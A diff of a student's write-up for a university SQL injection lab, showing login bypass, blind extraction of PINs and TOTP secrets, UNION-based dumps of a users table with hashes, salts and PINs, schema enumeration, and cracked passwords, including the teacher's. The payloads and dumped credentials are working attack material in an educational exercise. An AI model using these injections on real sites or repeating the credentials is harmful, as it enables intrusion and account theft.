@@ -4,20 +4,20 @@ The goal was to hack web application which is vulnerable to SQL Injection. The w
 
 # 1. Task: Login without password
 
-**Assignment** 
+**Assignment**  
 On the main page, there is a login form that you need to pass through, without knowledge of password. As a username use your FEL login name.
 
-**Solution**
+**Solution**  
 I put in `' OR 1=1; #` instead of username and `#` instead of password. The query for login in database is `SELECT username FROM users WHERE username = '$_POST[username]' AND password = SHA1('$_POST[password]' . '$salt')`. When we use a single quote `'` then we close first parameter in query. Next with `OR 1=1;` we say that all is true. Finally, we will comment the rest of query in database.  
 
 _Login_: `' OR 1=1; #`
 _Password_: `#`
 
 # 2. Task: Find out your PIN
-**Assignment**
+**Assignment**  
 As you can see, your account is not only password-protected, but also PIN-protected. Try to find out your PIN using the vulnerability from the previous task.
 
-**Solution**
+**Solution**  
 The pin has 4 digits. I gradually tried to find digit by digit. For this purpose, I used the following function `LEFT(string, length)`, which returns a specified number of characters from the left of the string. For example, for finding the first digit I put in the following text to username `matijmic' AND LEFT(pin, 1) = '0'#` and gradually changed the numbers. The Password was the same as in the previous solution, thus `#`. The digit was found if the login was a success. After finding the first digit, I tried to find the second, third and fourth digits and used a similar principle.
 
 _Login_: `matijmic' AND LEFT(pin, 3) = '860'#`
@@ -25,10 +25,10 @@ _Password_: `#`
  _Pin_: **8676**
  
  # 3. Task: Overcome One-Time-Password
-**Assignment**
+**Assignment**  
 PIN-protection didn't stop you? Easy-peasy? Well, try to defeat the next layer of protection Time-based One-Time Password widely used industry standard for 2-factor authentication.
 
-**Solution**
+**Solution**  
 Firstly, I found out length of secret. The size was 16. Next, I used same method for finding secret as in the previous task(2. task). After finding the secret, I used the following website https://totp.app/ to generate One-Time password.
 
 _Login_: `matijmic' AND LENGTH(secret) = 10#`
@@ -40,10 +40,10 @@ _Password_: `#`
 _Secret_: **27xsbywhuonpwdfd**
 
 # 4. Task: Exfiltrate a list of all usernames, passwords, salts, secrets and pins
-**Assignment**
+**Assignment**  
 Bored of reading secret messages? Let's do some harm. What about exfiltrating all data stored in the database?
 
-**Solution**
+**Solution**  
 I used offset and union select for retrieving usernames, paswwords, salts and pins from the users table. Because of the limitation of the number of columns we can select, I used concat function. The result of the select is below in the table.
 
 _Url_: `https://kbe.felk.cvut.cz/index.php?offset=0 union select concat(username, ',', password, ',', salt, ',', secret, ',', pin), 1 from users`
@@ -71,10 +71,10 @@ _Url_: `https://kbe.felk.cvut.cz/index.php?offset=0 union select concat(username
 | vankope6      | 043e058894d0e34d13767d0d976dc1d34766368c      | 7e284 | UNOFIJ3EDBIUNILS  | 2186  |
 
 # 5. Task: Crack your password hash
-**Assignment**
+**Assignment**  
 Do you want to be able to login as an ordinary user? Well, then you need to know your password in addition to your PIN and SECRET key.
 
-**Solution**
+**Solution**  
 I used a brute-force attack. The whole script is in [lab3.py](lab3.py). Below is part of the script which I used for the solution of 5. task. I knew sha1 hash from previous task(4. task) `2655a13f039e9966d590ca8e260cc1a48bf494a6` and salt `1e09d`. I wrote function `find_passwd()` where I first found all permutation with repetition and following I create a hash of these possible passwords and check against to hash obtained from task 4. 
 
 _Pasword_: **22eac**
@@ -113,11 +113,11 @@ print(find_passwd())
 ```
 
 # 6. Task: Crack teacher's password hash
-**Assignment**
+**Assignment**  
 No comment.
 ⚠️ Warning ⚠️: Do not use brute-force as the password is quite long. Online tools should be sufficient.
 
-**Solution**
+**Solution**  
 I used the following website for finding a password https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85
 
 _Password_: **fm9fytmf7q**
@@ -125,17 +125,17 @@ _Salt_: kckct
 _Url_: https://hashtoolkit.com/decrypt-hash/?hash=2d55131b6752f066ee2cc57ba8bf781b4376be85
 
 # 7. Task: Explain why teacher's password is insecure despite it's length
-**Assignment**
+**Assignment**  
 
-**Solution**
+**Solution**  
 I think that uses only lower case characters and numbers are insufficient because password space is only 36 ^ 10. The second problem see that f is mostly repetitive and this to increase the chance of finding a password.
 
 _Password_: **fm9fytmf7q**
 
 # 8. Task: Print a list of all table names and their columns
-**Assignment**
+**Assignment**  
 
-**Solution**
+**Solution**  
 I used union select the same as in 4. task. I put in the following union select to URL `union select concat(table_name, ',', table_schema, ',', COLUMN_NAME), 1 FROM INFORMATION_SCHEMA.columns` for retrieving all tables and their columns. We can see the result below in the table.
 
 _Url_: `https://kbe.felk.cvut.cz/index.php?offset=0%20union%20select%20concat(table_name,%20%27,%27,%20table_schema,%20%27,%27,%20COLUMN_NAME),%201%20FROM%20INFORMATION_SCHEMA.columns`
@@ -188,10 +188,10 @@ _Url_: `https://kbe.felk.cvut.cz/index.php?offset=0%20union%20select%20concat(ta
 
 
 # 9. Task: Derive xor key used for encoding your messages
-**Assignment**
+**Assignment**    
 As you might have noticed, the secret messages are stored in an encrypted form in the database, but before printing they are decrypted on the backend. Since you have access to both forms of messages, try to derive the xor key used for encoding/decoding your messages.
 
-**Solution**
+**Solution**  
 Firstly, I use the following website https://cryptii.com/pipes/base64-to-hex for decode base64 to hex. Next, I wrote a script for finding the key. Since we know messages and hex-s we can xor character by character thereby we will xor one hex by 256 integers and the result of this xor-s will be equal to one character of the message.
 
 _Url_: https://cryptii.com/pipes/base64-to-hex
